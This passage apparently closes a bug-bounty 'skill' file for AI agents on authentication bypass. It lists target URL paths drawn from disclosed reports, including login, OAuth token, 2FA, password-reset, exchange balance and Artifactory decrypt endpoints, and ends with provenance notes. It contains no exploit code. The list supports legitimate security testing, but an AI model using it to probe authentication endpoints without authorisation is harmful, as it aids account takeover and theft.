/admin/apps/flow
/robots.txt
/products/canvas
/post/149985438982/reading-ubers-internal-emails-uber-bug-bounty
/login/oauth/access_token
/rooms/2/2-/messages
/pocs/digits-validation-bypass/
/rails/active_storage/blobs/redirect/
/fyeem62eqa2ipopoty6c5j0aye3t
/rails/active_storage/direct_uploads
/messages/support/new
/reset/█████
/5218370/verify
/app/login
/pocs/digits-host-validation-bypass-hpp/
/api/Account/Login/
/mtn_otp/index/verification/
/User/FrontDoorLogin/
/User/AuthenticateForms
/User/Login
/SessionVerify
/Me
/SessionCreate
/api/bitcoinDepositAddresses
/api/bitcoinWithdrawalFees
/api/transferHistory
/api/transactionHistory
/api/tradeHistory
/api/openOrders
/api/orderHistory
/api/traderFees
/api/balances
/users
/api/2fa
/api/2fa/verify
/pocs/digits-bridge-origin-validation-bypass/
/web/digits/getting-started.html
/login_status
/artifactory/api/system/configuration
/artifactory/corda-dev
/artifactory/api/repositories/rce-test-remote
/access/api/v1/tokens
/access/api/v1/registry/join
/artifactory/api/system/decrypt
```

## Source skills merged into this topic

- `h1skills` — `hackerone-auth-bypass`
- `hunting` — `auth-bypass`
- `cbh` — `hunt-auth-bypass`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
